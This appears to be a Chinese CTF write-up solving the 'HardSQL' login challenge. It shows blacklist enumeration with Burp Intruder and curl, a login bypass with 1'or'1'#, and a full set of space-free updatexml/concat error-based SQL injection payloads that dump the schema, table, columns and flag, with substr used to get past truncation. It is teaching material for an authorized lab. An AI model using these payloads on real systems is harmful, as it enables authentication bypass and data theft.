---
title: "[极客大挑战 2019] HardSQL：空格、UNION、盲注全被拦，改用 updatexml 报错注入"
date: 2026-11-07 10:00:00
updated: 2026-11-07 10:00:00
categories:
  - CTF
  - Web
  - SQL 注入
tags:
  - SQL 注入
  - 报错注入
  - updatexml
  - 黑名单绕过
  - Burp Suite
  - 极客大挑战
description: 空格、union、sleep、||、&& 全被拉黑，UNION 和时间盲注都走不通。用 Burp Intruder 摸清黑名单后，靠 or + updatexml + concat 的报错注入依次爆库、爆表、爆列；再讲清楚 32 字符截断和 substr 补全 flag 的完整过程。
difficulty: 入门
topic: SQL 注入
series: SQL 注入
series_order: 5
permalink: 2026/11/07/web-ctf-sql-hardsql/
---

{% note primary %}
**一分钟速览**

- **难度**：入门（建议先看 [BabySQL](/2026/10/30/web-ctf-sql-babysql/)，这题是同一系列的进阶）
- **考点**：黑名单枚举、报错注入、`updatexml` + `concat`、32 字符截断与 `substr` 补全
- **过滤情况**：空格、`union`、`sleep`、`||`、`&&`、`\`、`*` 被拦；`or`、`select`、`updatexml`、`concat`、`group_concat`、`information_schema` 可用
- **路线**：`or` 万能密码 → `updatexml` 报错爆库 → 爆表 → 爆列 → 拖数据
- **关键限制**：一条报错最多带出 32 个字符，flag 要分两次取
- **flag**：`CTF2{e5a829b7-0f7e-42df-829-46d6-9f95-2a0d28086b64}`
{% endnote %}

{% note info %}
**阅读说明**

- **前置知识**：`UNION SELECT`、`information_schema` 爆库爆表、Burp Intruder 的基本用法（前四篇都讲过）
- **工具**：Burp Suite（Intruder 模块）、浏览器。没有 Burp 也能做，文中有 `curl` 版本。
- **环境**：文中的靶场地址是当时的临时环境，现在多半已经失效，请换成自己的靶场或本地环境
- 本文所有操作仅用于**授权靶场和教学**，请勿对未授权的目标做任何测试
{% endnote %}

{% note default %}
**做题路线**

`单引号确认注入` → `试 || 被拦` → `or 万能密码` → `Intruder 摸黑名单` → `updatexml 爆库` → `爆表` → `爆列` → `拖数据` → `substr 补全`
{% endnote %}

## 先看题目：还是那个登录框

打开靶场，还是熟悉的画风，只是这次作者的语气更狠了：

![HardSQL 登录页](image.png)

*图 1：同一个系列的登录页，背景上写着“这次，再也没有人能拿到我的flag了”*

页面顶部的原话是：

> 没错，又是我，这群该死的黑客竟然如此厉害，所以我回去爆肝SQL注入，这次，再也没有人能拿到我的flag了！

之前 [EasySQL](/2026/10/22/web-ctf-sql-easysql-geek/)、[LoveSQL](/2026/10/22/web-ctf-sql-lovesql/) 和 [BabySQL](/2026/10/30/web-ctf-sql-babysql/) 打的是同一个登录框，这一题就是作者被打了三次之后，回去“爆肝”加过滤的产物。

所以这题的重点不是“怎么注入”，而是**过滤了什么、还剩什么能用**。

## 第一步：单引号确认注入点

老规矩，先在用户名里输入一个单引号：

```text
1'
```

页面直接报 SQL 语法错误，响应长度也明显和其他请求不同（后面 Intruder 表里能看到是 1024 字节）。

这一步至少说明三件事：

1. 单引号被原样带进了 SQL，注入点存在；
2. 后端没有把错误吞掉，**SQL 报错会回显到页面上**；
3. 第 2 点非常关键——它意味着我们可以走**报错注入**，让数据库把查询结果放进错误信息里带出来。

{% note info %}
**为什么报错回显这么重要？**

报错注入的前提是“你能看到数据库的报错”。如果站点把错误统一替换成“系统繁忙”，报错注入就没法用，只能转盲注。这题能看到 `XPATH syntax error` 这类原始错误，等于把数据库的嘴巴留给了我们。
{% endnote %}

后端 SQL 大概率长这样：

```sql
SELECT * FROM users WHERE username='$username' AND password='$password'
```

用户名和密码都是字符型，用单引号包起来。接下来所有 payload 都围绕这个结构展开。

## 第二步：试万能密码，先撞上一次过滤

最顺手的当然是 `1'||1#`，BabySQL 里就是这么进去的。把它放进 Burp 发送：

![在 Burp 里试 ||](image-1.png)

*图 2：`username=1'||1#`，URL 里编码成 `1%27%7C%7C1%23`*

URL 编码对照一下：

| 编码 | 字符 |
| --- | --- |
| `%27` | `'` |
| `%7C` | `|` |
| `%23` | `#` |

结果页面没登录成功，而是弹出一句：

> 你可别被我逮住了，臭弟弟

这就是作者写的**拦截页**。说明 `||` 在黑名单里，这条路被封了。

换个写法，把 `||` 换成单词 `or`：

![用 or 登录](image-3.png)

*图 3：用户名 `1'or'1'#`，密码随便填*

登录成功：

![Login Success](image-4.png)

*图 4：`Login Success!!`*

同样是逻辑或，`||` 被拦，`or` 却没事。这不是作者写错了，而是黑名单只覆盖了符号和部分关键字，`or` 恰好是漏网之鱼。

代入 SQL 看一眼：

```sql
SELECT * FROM users
WHERE username='1'or'1'#' AND password='1'
```

- `username='1'`：数据库里没有叫 `1` 的用户，结果为假；
- `or '1'`：`'1'` 在布尔上下文里是 1（真），整个条件为真；
- `#`：把后面的 `' AND password='1'` 全部注释掉。

所以不输入正确密码也能登录。不过登录成功只是开始，flag 不在登录页上，得继续从数据库里拖。

## 第三步：用 Intruder 摸清黑名单

手工一个一个试太慢，直接上 Burp Intruder。

**1. 把请求送到 Intruder**

在 `Proxy → HTTP history` 里找到登录请求，右键 → `Send to Intruder`（`Ctrl+I`）。

**2. 设置 payload 位置**

切到 `Positions`，点 `Clear §`，选中 `username` 的值，点 `Add §`：

```http
GET /check.php?username=§1§&password=1 HTTP/1.1
Host: <靶场地址>
```

**3. 准备字典**

把常见的关键字、符号、绕过写法都放进去：

```text
or
1 or
'
\
(
)
*
union
select
updatexml
seselectlect
||
&&
sleep
database
group_concat
concat
information_schema
```

**4. 按 Length 排序看结果**

![Intruder 结果](image-2.png)

*图 3：每个 payload 都返回 200，但响应长度分成了三档*

把长度整理出来：

| payload | 长度 | 结论 |
| --- | --- | --- |
| （空） | 779 | 基线 |
| `or` | 804 | 通过 |
| `1 or` | 789 | **空格被拦** |
| `'` | 1024 | 语法报错页 |
| `\` | 789 | 被拦 |
| `(` | 804 | 通过 |
| `)` | 804 | 通过 |
| `*` | 789 | 被拦 |
| `union` | 789 | 被拦 |
| `select` | 804 | 通过 |
| `updatexml` | 804 | 通过 |
| `seselectlect` | 804 | 通过（但这题不需要双写） |
| `\|\|` | 789 | 被拦 |
| `&&` | 789 | 被拦 |
| `sleep` | 789 | 被拦 |
| `database` | 804 | 通过 |
| `group_concat` | 804 | 通过 |
| `concat` | 804 | 通过 |
| `information_schema` | 804 | 通过 |

三种长度分别对应三个页面：

| 长度 | 页面 | 含义 |
| --- | --- | --- |
| 779 | 空请求 | 没有实际内容，作为基线 |
| 789 | “你可别被我逮住了，臭弟弟” | 命中黑名单，被拦截 |
| 804 | 正常的登录失败页 | 关键字通过过滤，SQL 正常执行 |
| 1024 | SQL 语法报错页 | 单引号破坏了语法，且错误回显 |

{% note warning %}
**注意：这题的黑名单是“发现就拦”，不是 BabySQL 的“发现就删”。**

BabySQL 里关键字被 `str_ireplace` 删掉，所以能用 `ununionion` 双写补回来；这题一旦命中就返回拦截页，双写没有意义。`seselectlect` 显示 804，只说明这个字符串本身没被拉黑，不代表双写能绕过什么。

黑名单和删除式过滤，要分开判断。
{% endnote %}

{% note success %}
**没有 Burp 也能摸**：用 `curl` 循环，看 `size_download`。

```bash
for w in or union select sleep updatexml concat group_concat information_schema; do
  printf '%-20s ' "$w"
  curl -s -o /dev/null -w '%{size_download}\n' -G 'http://<靶场地址>/check.php' \
    --data-urlencode "username=$w" \
    --data-urlencode 'password=1'
done
```

`--data-urlencode` 会自动处理引号和特殊字符。看到 789 就是被拦，804 就是通过，1024 就是报错页。
{% endnote %}

### 从结果里读出四件事

1. **`union` 被拦**：UNION 注入走不通，前面几题“定列数、找回显位”的套路直接作废；
2. **`sleep` 被拦**：时间盲注也走不通；
3. **空格被拦**：payload 里不能写出空格，得靠括号把 token 拼起来；
4. **`updatexml`、`concat`、`group_concat`、`information_schema`、`select` 都能用**：报错注入的路还开着。

所以这题的路线就定了：**用报错注入，把查询结果塞进 `updatexml` 的错误信息里带出来。**

## 第四步：报错注入是怎么工作的

先补一点原理，不然后面的 payload 会像天书。

`updatexml()` 是 MySQL 的 XML 函数：

```text
updatexml(XML_document, XPath_string, new_value)
```

它的作用是在 XML 文档里找到 XPath 对应的节点并替换。如果 **XPath 写得不合法**，MySQL 会直接抛错：

```text
XPATH syntax error: '<你写的 XPath>'
```

关键就在这个错误信息：**它会把你写的 XPath 原样带出来。**

于是思路是：

1. 构造一个非法的 XPath；
2. 把想查的数据拼进这个 XPath；
3. 数据库报错时，数据就跟着错误信息一起显示在页面上了。

最常用的写法是：

```sql
updatexml(1, concat(0x7e, (select database()), 0x7e), 1)
```

逐段拆开：

| 部分 | 作用 |
| --- | --- |
| `updatexml(` | 调用 XML 更新函数 |
| `1` | 随便给一个“XML 文档”，反正用不到 |
| `concat(0x7e, ..., 0x7e)` | 用 `~` 把数据包起来，方便从报错里截取 |
| `0x7e` | 十六进制写法，等于字符 `~` |
| `(select database())` | 真正要查的数据，这里查当前数据库名 |
| `1` | 新的 XML 值，同样用不到 |

为什么第一个参数给 `1` 也能报错？因为 MySQL 会先把 XPath 字符串解析一遍，发现里面有 `~` 这个非法字符，直接抛 `XPATH syntax error`，根本轮不到校验 XML 文档。

### 为什么要包一层 `~`

报错信息长这样：

```text
XPATH syntax error: '~geek~'
```

两个 `~` 是我们自己加的，中间的 `geek` 才是数据。这样不管数据里有没有别的字符，都能一眼看出边界。

用 `0x7e` 而不是写 `'~'`，还有两个好处：

- 不引入引号，不会和 payload 里的单引号打架；
- 黑名单通常只拦引号和相关关键字，十六进制字面量更容易活下来。

### 32 个字符的限制

`updatexml` 的错误信息不是无限长的，**最多带出 32 个字符**。

这就会出现图 9 那种情况：flag 明明很长，报错却只显示到一半：

```text
XPATH syntax error: '~flag~CTF2{e5a829b7-0f7e-42df-82'
```

解决办法是用 `substr()` 分页取：

```sql
substr(字符串, 起始位置, 长度)
```

起始位置从 1 开始数。第一次取到第 26 位，第二次就从第 27 位接着取，两段拼起来就是完整数据。

{% note info %}
**同类函数：`extractvalue`**

`extractvalue(XML_document, XPath_string)` 只有两个参数，报错格式和 `updatexml` 一样，也有 32 字符限制。如果 `updatexml` 被拦或者版本不支持，可以换成：

```sql
extractvalue(1, concat(0x7e, (select database()), 0x7e))
```

思路完全一样，只是函数名和参数个数不同。
{% endnote %}

## 第五步：爆库

先查当前数据库名：

```text
1'or(updatexml(1,concat(0x7e,(select(database())),0x7e),1))#
```

![爆出数据库名](image-5.png)

*图 6：`XPATH syntax error: '~geek~'`，数据库名是 `geek`*

payload 里一个空格都没有，逐段看：

| 片段 | 作用 |
| --- | --- |
| `1'` | 闭合 `username='` |
| `or` | 逻辑或，让后面的表达式被执行 |
| `(updatexml(...))` | 报错函数，外面套括号是为了不用空格 |
| `concat(0x7e,(select(database())),0x7e)` | 用 `~` 包住数据库名 |
| `#` | 注释掉后面的 `' AND password='...'` |

代入 SQL：

```sql
SELECT * FROM users
WHERE username='1'or(updatexml(...))#' AND password='1'
```

这里有个细节：为什么用 `or` 而不是 `and`？

因为 `username='1'` 匹配不到用户，结果是**假**：

- `假 and 右边` 会短路，右边根本不执行；
- `假 or 右边` 必须继续算右边，`updatexml` 才有机会执行并报错。

所以“左边为假 + `or`”正好把报错函数送进执行路径。反过来，如果左边是真的（比如数据库里真有用户 `1`），`or` 反而会短路，这时候才该用 `and`。

{% note warning %}
**别照抄 BabySQL 的双写。** 这题的关键字不是被删掉，而是被拦截页挡住。`ununionion`、`seselectlect` 在这里没有意义，`select` 本来就能直接写。
{% endnote %}

## 第六步：爆表

知道数据库叫 `geek`，去 `information_schema.tables` 里找它下面的表：

```text
1'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')),0x7e),1))#
```

![爆出表名](image-6.png)

*图 7：`XPATH syntax error: '~H4rDsq1~'`，表名是 `H4rDsq1`*

拆开看新增的部分：

| 片段 | 作用 |
| --- | --- |
| `select(group_concat(table_name))` | 把表名拼成一个字符串 |
| `from(information_schema.tables)` | 从系统表里查 |
| `where(table_schema='geek')` | 只看 `geek` 库 |
| `group_concat(...)` | 多行结果用逗号拼起来 |

`information_schema` 是 MySQL 的系统库，里面存着“数据库里有什么”的元信息。常用的两张表：

| 表 | 里面的关键字段 | 用途 |
| --- | --- | --- |
| `information_schema.tables` | `table_schema`、`table_name` | 查某个库下有哪些表 |
| `information_schema.columns` | `table_schema`、`table_name`、`column_name` | 查某张表有哪些列 |

这题只有一个表 `H4rDsq1`，所以输出是 `~H4rDsq1~`。如果表很多，`group_concat` 会用逗号隔开，一样能看。

{% note info %}
**payload 里为什么没有空格？**

回头看黑名单那张表：`or` 单独出现时长度是 804，**通过**；写成 `1 or` 立刻变成 789，**被拦截**。同一个关键词，只多了一个空格，结果就从“能用”变成“被拦”——说明空格本身就是过滤条件，不是 `or` 被拉黑了，而是带空格的请求整体过不去。

也就是说，如果按平时的习惯写 `1' or 1#`、`union select 1,2,3`、`and sleep(5)`，请求在空格这一步就被拦下了，后面的关键字根本没机会参与解析。所以这题不是先想“用哪个关键字”，而是先保证整条 payload 里一个空格都没有。

SQL 的 token 之间不一定非要空格。`from(information_schema.tables)`、`where(table_schema='geek')`、`select(group_concat(...))` 这些写法，括号和逗号本身就起到了分隔作用，MySQL 能正常解析。

常见的“空格替代”是 `/**/`，但这题 `*` 同样被拉黑（表里也是 789），所以 `/**/` 也用不了。**能用的分隔手段只剩括号**，这也是这道题 payload 看起来特别挤的原因。
{% endnote %}

## 第七步：爆列

表名有了，继续查 `H4rDsq1` 有哪些列：

```text
1'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name='H4rDsq1')),0x7e),1))#
```

![爆出列名](image-8.png)

*图 8：`XPATH syntax error: '~id,username,password~'`*

三个列：`id`、`username`、`password`。

结构已经很清楚了：

```text
库：geek
表：H4rDsq1
列：id, username, password
```

flag 大概率在 `password` 里，`username` 里可能有个标记行，先把整行拖出来看看。

## 第八步：拖数据，先拿 flag 的前半截

把 `username` 和 `password` 拼在一起查：

```text
1'or(updatexml(1,concat(0x7e,(select(group_concat(username,0x7e,password))from(H4rDsq1)),0x7e),1))#
```

![flag 前 32 个字符](image-7.png)

*图 9：`XPATH syntax error: '~flag~CTF2{e5a829b7-0f7e-42df-82'`*

报错信息是：

```text
~flag~CTF2{e5a829b7-0f7e-42df-82
```

拆开看：

| 部分 | 含义 |
| --- | --- |
| 第一个 `~` | `concat` 加的起始标记 |
| `flag` | 用户名（`username` 列） |
| 第二个 `~` | `group_concat(username,0x7e,password)` 里的分隔符 |
| `CTF2{e5a829b7-0f7e-42df-82` | flag 的开头 |
| 结尾没有 `~` | 因为 32 个字符已经到上限，被截断了 |

这行数据的 `username` 是 `flag`，`password` 就是 flag。

但报错只带出了 32 个字符，flag 还没结束。数一下：`~flag~` 占了 6 个字符，真正看到的 flag 只有前 26 位：

```text
CTF2{e5a829b7-0f7e-42df-82
```

剩下的必须再发一次请求。

## 第九步：用 substr 补全 flag

从第 27 位开始，取剩下的部分：

```text
1'or(updatexml(1,concat(0x7e,substr((select(password)from(H4rDsq1)where(username='flag')),27,30),0x7e),1))#
```

![flag 剩余部分](image-9.png)

*图 10：`XPATH syntax error: '~9-46d6-9f95-2a0d28086b64}~'`*

这次的结果：

```text
~9-46d6-9f95-2a0d28086b64}~
```

去掉两边的 `~`，剩下的就是 flag 从第 27 位开始的内容：

```text
9-46d6-9f95-2a0d28086b64}
```

把两段拼起来：

```text
CTF2{e5a829b7-0f7e-42df-82  +  9-46d6-9f95-2a0d28086b64}
= CTF2{e5a829b7-0f7e-42df-829-46d6-9f95-2a0d28086b64}
```

完整 flag：

```text
CTF2{e5a829b7-0f7e-42df-829-46d6-9f95-2a0d28086b64}
```

### substr 的用法

```sql
substr(字符串, 起始位置, 长度)
```

- 起始位置从 **1** 开始，不是 0；
- 长度可以省略，省略时一直取到结尾；
- `mid()` 是它的别名，用法完全一样；
- 还可以用 `right(字符串, 长度)` 从右边取，或者 `left()` 从左边取。

这题的取法：

| 请求 | 取的范围 | 结果 |
| --- | --- | --- |
| 第一次 | 整个 `username~password` | `~flag~CTF2{e5a829b7-0f7e-42df-82` |
| 第二次 | `password` 第 27 位起 | `~9-46d6-9f95-2a0d28086b64}~` |

{% note success %}
**32 字符限制的通用解法**

遇到 `updatexml` / `extractvalue` 只回显一部分时，不要手动猜，直接按 30 个字符一页循环：

```sql
substr((select(password)from(H4rDsq1)where(username='flag')), 1, 30)
substr(..., 31, 30)
substr(..., 61, 30)
```

每次把起点往后推 30，直到返回空字符串为止。写脚本的话，把起点做成变量最省事。
{% endnote %}

{% note warning %}
**注意 `~` 也会占位置。**

`concat(0x7e, ..., 0x7e)` 两边的 `~` 都在 32 个字符里。所以第一页真正能带出的数据不是 32 个字符，而是 30 个左右。算偏移时要把标记符也算进去，不然会漏字符或重复。
{% endnote %}

## 新手常见问题

{% note info %}

**Q1：为什么用 `or`，不用 `and`？**


`username='1'` 匹配不到用户，结果是假。`假 and 右边` 会短路，`updatexml` 不执行；`假 or 右边` 必须继续算右边，才会触发报错。如果左边是真的（比如用户名填的是数据库里真实存在的 `admin`），那就反过来，用 `and` 才能让右边执行。
{% endnote %}

{% note info %}

**Q2：payload 里为什么一个空格都没有？**


黑名单表里 `or` 是 804（通过），`1 or` 是 789（被拦）——只多一个空格就过不去，说明空格本身就是过滤条件。所以像 `1' or 1#`、`union select ...` 这种带空格的传统 payload，在第一步就被拦了，根本轮不到关键字判断。去掉空格之后，SQL 的括号、逗号本身就能分隔 token，`select(group_concat(table_name))from(information_schema.tables)where(...)` 不需要空格也能解析；`/**/` 也不行，因为 `*` 同样被拦。
{% endnote %}

{% note info %}

**Q3：`0x7e` 是什么？为什么要用 `~`？**


`0x7e` 是十六进制字面量，等于字符 `~`（十进制 126）。用它包住数据，报错里就能清楚看到数据的起止位置。写成十六进制还能避免引入引号，减少和 payload 里单引号、黑名单的冲突。
{% endnote %}

{% note info %}

**Q4：为什么报错只显示 32 个字符？**


`updatexml` 和 `extractvalue` 的 XPath 报错本身有长度限制，最多带出 32 个字符。超过的部分会被截断，所以长数据必须用 `substr` 分段取，再拼起来。
{% endnote %}

{% note info %}

**Q5：`updatexml` 和 `extractvalue` 有什么区别？**


两者都是 XML 函数，都能触发 `XPATH syntax error`。`updatexml` 三个参数，`extractvalue` 两个参数；报错格式和 32 字符限制一样。一个被拦或不可用时换另一个即可，思路不变。
{% endnote %}

{% note info %}

**Q6：`concat` 和 `group_concat` 有什么区别？**


`concat(a,b,c)` 把**同一行**的多个值拼起来；`group_concat(col)` 把**多行**的值用逗号拼成一个字符串，还可以写 `group_concat(username,0x7e,password)` 同时拼多个字段。`group_concat` 默认有 1024 字节上限，数据太长时要配合 `substr` 分段。
{% endnote %}

{% note info %}

**Q7：为什么 `||` 被拦，`or` 反而没事？**


黑名单覆盖的是符号和部分关键字，`||`、`&&` 在名单里，单词 `or` 不在。不同题目的黑名单盲区不一样，所以要先枚举再决定用哪种写法，不要凭经验硬套。
{% endnote %}

{% note info %}

**Q8：为什么不用 UNION？**


`union` 被黑名单拦住，返回的是“你可别被我逮住了，臭弟弟”拦截页。而且 UNION 还需要列数匹配、有回显位；报错注入不需要这些，只要能看见 SQL 报错就行。
{% endnote %}

{% note info %}

**Q9：`#` 和 `--` 注释有什么区别？**


`#` 注释到行尾，直接写就行，URL 里要编码成 `%23`；`--` 在 MySQL 里后面必须跟一个空格，而空格被这题拦了，所以这道题只能用 `#`。
{% endnote %}

{% note info %}

**Q10：报错注入打不出来怎么办？**


按顺序排查：页面是否回显 SQL 错误、函数是否可用、引号是否闭合、payload 是否被过滤。可以换 `extractvalue`、`floor(rand()*2)` 等其它报错函数；如果错误被隐藏，就只能转盲注或时间盲注（前提是 `sleep` 没被拦）。
{% endnote %}

{% note info %}

**Q11：为什么 `1'or'1'#` 能直接登录？**


代入后是 `username='1'or'1'#...`。`username='1'` 为假，`'1'` 为真，整个 `WHERE` 条件为真；`#` 又把密码判断注释掉了，所以不需要正确密码。
{% endnote %}

## 完整流程速查

| 步骤 | 目的 | payload / 操作 | 结果 |
| --- | --- | --- | --- |
| 1 | 确认注入点 | `1'` | SQL 语法报错 |
| 2 | 试符号绕过 | `1'\|\|1#` | 被拦截 |
| 3 | 万能密码 | `1'or'1'#` | Login Success |
| 4 | 摸黑名单 | Burp Intruder 比较长度 | 789 拦截 / 804 通过 / 1024 报错 |
| 5 | 爆库 | `1'or(updatexml(1,concat(0x7e,(select(database())),0x7e),1))#` | `geek` |
| 6 | 爆表 | `...group_concat(table_name)...information_schema.tables...` | `H4rDsq1` |
| 7 | 爆列 | `...group_concat(column_name)...information_schema.columns...` | `id,username,password` |
| 8 | 拖数据 | `...group_concat(username,0x7e,password)...` | flag 前 26 位 |
| 9 | 补全 | `...substr((select(password)...),27,30)...` | flag 剩余部分 |

## 小结

这道题把 SQL 注入里“换一条路”的思路走得很完整：

- **先确认注入点，再确认报错回显**。单引号报错 + 错误页回显，是报错注入的两个前提；
- **黑名单要靠枚举，不要靠猜**。`||` 被拦但 `or` 没事，`union` 和 `sleep` 被拦但 `updatexml` 能用，这些结论只有跑一遍才知道；
- **空格被拦不一定是死路**。括号可以替代空格，`/**/` 不一定能用（这题 `*` 也被拦）；
- **报错注入的核心是把数据拼进非法 XPath**。`updatexml(1, concat(0x7e, 数据, 0x7e), 1)`，数据就跟着 `XPATH syntax error` 一起出来；
- **32 字符限制要用 `substr` 分页**。算偏移时记得把两边的 `~` 也算进去；
- **过滤方式不同，绕过思路也不同**。BabySQL 是“删除式”，可以双写；这题是“拦截式”，只能换关键字或换注入类型。

下一题可以往这几个方向走：

| 方向 | 要解决的问题 |
| --- | --- |
| 时间盲注 | `sleep` 被拦时，用 `benchmark` 或条件判断构造时间差 |
| 布尔盲注 | 页面不回显、只回显“对/错”时，用 `substr` + 条件逐位猜 |
| 堆叠注入 | 能执行多条语句时，直接 `insert` / `update` 改数据 |
| 宽字节注入 | `addslashes` 转义单引号时，用 `%df` 吃掉反斜杠 |
| WAF 绕过 | 大小写、内联注释、编码、等价函数替换 |

{% note success %}
**一条经验**：SQL 注入题先别急着背 payload。先花五分钟搞清楚**三件事**——注入点在哪、什么被过滤、页面回显什么。这三件事定了，payload 是自然长出来的，不是背出来的。
{% endnote %}
